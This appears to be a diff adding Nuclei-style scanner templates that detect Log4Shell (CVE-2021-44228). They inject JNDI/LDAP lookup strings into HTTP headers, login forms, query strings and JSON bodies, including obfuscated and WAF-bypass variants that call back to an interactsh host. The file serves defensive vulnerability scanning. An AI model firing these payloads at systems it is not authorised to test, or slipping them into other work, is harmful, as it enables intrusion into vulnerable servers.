@@ -1,0 +1,259 @@
+id: log4shell-detection
+
+info:
+  name: Log4Shell RCE Detection (CVE-2021-44228)
+  author: Security Research Lab
+  severity: critical
+  description: Detects Log4Shell (CVE-2021-44228) vulnerability in web applications
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://logging.apache.org/log4j/2.x/security.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+  tags: cve,cve2021,log4j,log4shell,rce,critical,apache
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:ldap://{{interactsh-url}}/basic}
+        Referer: ${jndi:ldap://{{interactsh-url}}/referer}
+        X-Api-Version: ${jndi:ldap://{{interactsh-url}}/header}
+        X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/xff}
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: ${jndi:ldap://{{interactsh-url}}/post}
+
+        username=${jndi:ldap://{{interactsh-url}}/username}&password=${jndi:ldap://{{interactsh-url}}/password}
+
+      - |
+        GET /api/v1/search?query=${jndi:ldap://{{interactsh-url}}/search} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+      - |
+        POST /api/v1/callback HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"callback": "${jndi:ldap://{{interactsh-url}}/json}"}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "ldap"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+---
+
+id: log4shell-obfuscated
+
+info:
+  name: Log4Shell Obfuscated Payloads Detection
+  author: Security Research Lab
+  severity: critical
+  description: Detects obfuscated Log4Shell exploitation attempts
+  tags: cve,cve2021,log4j,log4shell,rce,obfuscation
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${::-j}ndi:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/obf1}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://{{interactsh-url}}/obf2}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://{{interactsh-url}}/obf3}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${sys:DOESNOTEXIST:-j}ndi:ldap://{{interactsh-url}}/obf4}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/obf5}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "ldap"
+
+---
+
+id: log4shell-waf-bypass
+
+info:
+  name: Log4Shell WAF Bypass Techniques
+  author: Security Research Lab
+  severity: critical
+  description: Advanced Log4Shell payloads designed to bypass WAF rules
+  tags: cve,cve2021,log4j,log4shell,waf-bypass
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:${lower:l}${lower:d}a${lower:p}://{{interactsh-url}}/waf1}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${${::-j}n${::-d}i:l${::-d}ap://{{interactsh-url}}/waf2}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${j${${:-n}di:ldap://{{interactsh-url}}/waf3}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jn${env:DOESNOTEXIST:-d}i:ldap://{{interactsh-url}}/waf4}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:ldap://127.0.0.1#.{{interactsh-url}}/waf5}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "ldap"
+
+---
+
+id: log4shell-headers-check
+
+info:
+  name: Log4Shell Headers Injection Points
+  author: Security Research Lab
+  severity: critical
+  description: Tests various HTTP headers for Log4Shell vulnerability
+  tags: cve,cve2021,log4j,log4shell,headers
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      User-Agent: "${jndi:ldap://{{interactsh-url}}/ua}"
+      Referer: "${jndi:ldap://{{interactsh-url}}/ref}"
+      X-Api-Version: "${jndi:ldap://{{interactsh-url}}/xapi}"
+      X-Forwarded-For: "${jndi:ldap://{{interactsh-url}}/xff}"
+      X-Real-IP: "${jndi:ldap://{{interactsh-url}}/xrip}"
+      X-Originating-IP: "${jndi:ldap://{{interactsh-url}}/xoip}"
+      X-Remote-IP: "${jndi:ldap://{{interactsh-url}}/xrip2}"
+      X-Client-IP: "${jndi:ldap://{{interactsh-url}}/xcip}"
+      X-Forwarded-Host: "${jndi:ldap://{{interactsh-url}}/xfh}"
+      Origin: "${jndi:ldap://{{interactsh-url}}/origin}"
+      Accept-Language: "${jndi:ldap://{{interactsh-url}}/al}"
+      Accept-Encoding: "${jndi:ldap://{{interactsh-url}}/ae}"
+      Accept: "${jndi:ldap://{{interactsh-url}}/accept}"
+      Cookie: "session=${jndi:ldap://{{interactsh-url}}/cookie}"
+      X-Custom-Header: "${jndi:ldap://{{interactsh-url}}/custom}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "ldap"
+
+---
+
+id: log4shell-post-data
+
+info:
+  name: Log4Shell POST Data Injection
+  author: Security Research Lab
+  severity: critical
+  description: Tests POST parameters for Log4Shell vulnerability
+  tags: cve,cve2021,log4j,log4shell,post
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/auth"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}/api/v1/auth"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      username=${jndi:ldap://{{interactsh-url}}/username}&password=${jndi:ldap://{{interactsh-url}}/password}&email=${jndi:ldap://{{interactsh-url}}/email}&submit=Login
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "ldap"
+
+---
+
+id: log4shell-json-injection
+
+info:
+  name: Log4Shell JSON Payload Injection
+  author: Security Research Lab
+  severity: critical
+  description: Tests JSON endpoints for Log4Shell vulnerability
+  tags: cve,cve2021,log4j,log4shell,json
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/callback"
+      - "{{BaseURL}}/api/webhook"
+      - "{{BaseURL}}/api/log"
+      - "{{BaseURL}}/api/event"
+      - "{{BaseURL}}/api/data"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "callback": "${jndi:ldap://{{interactsh-url}}/json-callback}",
+        "data": "${jndi:ldap://{{interactsh-url}}/json-data}",
+        "message": "${jndi:ldap://{{interactsh-url}}/json-message}",
+        "user": "${jndi:ldap://{{interactsh-url}}/json-user}",
+        "action": "${jndi:ldap://{{interactsh-url}}/json-action}"
+      }
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "ldap"
